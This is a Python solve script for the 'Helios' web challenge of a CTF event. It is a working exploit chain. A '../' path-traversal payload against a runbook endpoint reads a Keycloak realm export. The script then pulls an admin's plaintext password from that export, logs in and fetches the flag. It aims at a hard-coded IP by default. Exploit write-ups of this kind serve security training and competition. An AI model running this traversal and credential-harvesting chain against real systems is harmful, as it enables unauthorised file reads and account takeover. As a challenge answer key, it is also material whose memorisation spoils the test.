"""Solve script for Helios (Web Application Security, SECPlayground Hackloween CTF 2026).

Chain:
1. The ops-runbook renderer (`/ops/runbook?doc=<name>`) does no path
   sanitisation, so a `../` payload in `doc` reads arbitrary files.
2. One of the legitimate runbooks (`idp.md`) documents the on-disk path of
   the Keycloak realm import used to boot the `helios` realm:
   `/opt/keycloak/data/import/realm-helios.json`.
3. That export is plaintext and contains every user's password plus their
   realm-role assignments, including who holds `platform-admin`.
4. The ops portal's own `/login` form accepts those credentials directly
   (it performs the Keycloak Resource-Owner-Password-Credentials exchange
   server-side) and sets a Flask session cookie.
5. `/vault`, gated only on the `platform-admin` realm role, then serves the
   flag to that session.

Usage:
    python3 solve.py [--host HOST] [--port PORT]

No third-party dependencies; uses only `urllib` and `http.cookiejar` from
the standard library so it matches the plain, pytest-compatible style used
across this repo's solve scripts.
"""

from __future__ import annotations

import argparse
import http.cookiejar
import json
import re
import urllib.error
import urllib.parse
import urllib.request

TRAVERSAL_PAYLOAD = "../../../../opt/keycloak/data/import/realm-helios.json"
FLAG_RE = re.compile(r"web\{[^}]+\}")


def build_opener() -> tuple[urllib.request.OpenerDirector, http.cookiejar.CookieJar]:
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    return opener, jar


def fetch_realm_export(opener: urllib.request.OpenerDirector, base: str) -> dict:
    """Exploit the path-traversal in the runbook renderer to read the realm
    import, which is never served intentionally."""
    url = f"{base}/ops/runbook?doc={TRAVERSAL_PAYLOAD}"
    with opener.open(url, timeout=10) as resp:
        body = resp.read().decode()
    return json.loads(body)


def find_platform_admin(realm_export: dict) -> tuple[str, str]:
    """Return (username, password) for the first enabled user whose
    realmRoles include `platform-admin`."""
    for user in realm_export.get("users", []):
        if "platform-admin" in user.get("realmRoles", []) and user.get("enabled"):
            creds = user["credentials"][0]
            assert creds["type"] == "password" and not creds["temporary"]
            return user["username"], creds["value"]
    raise LookupError("no enabled platform-admin user found in realm export")


def login(opener: urllib.request.OpenerDirector, base: str, username: str, password: str) -> None:
    data = urllib.parse.urlencode({"username": username, "password": password}).encode()
    req = urllib.request.Request(f"{base}/login", data=data, method="POST")
    # The portal redirects to /vault on success; a GET there is issued
    # separately below so we don't depend on redirect-method handling.
    try:
        opener.open(req, timeout=10)
    except urllib.error.HTTPError as exc:
        if exc.code not in (302, 303):
            raise


def read_vault(opener: urllib.request.OpenerDirector, base: str) -> str:
    with opener.open(f"{base}/vault", timeout=10) as resp:
        body = resp.read().decode()
    match = FLAG_RE.search(body)
    if not match:
        raise LookupError("flag pattern not found on /vault — session not authorised?")
    return match.group(0)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default="35.198.204.5")
    parser.add_argument("--port", default="80")
    args = parser.parse_args()
    base = f"http://{args.host}:{args.port}"

    opener, _jar = build_opener()

    realm_export = fetch_realm_export(opener, base)
    username, password = find_platform_admin(realm_export)
    print(f"[+] platform-admin user: {username}")

    login(opener, base, username, password)
    flag = read_vault(opener, base)
    print(f"[+] flag: {flag}")


if __name__ == "__main__":
    main()
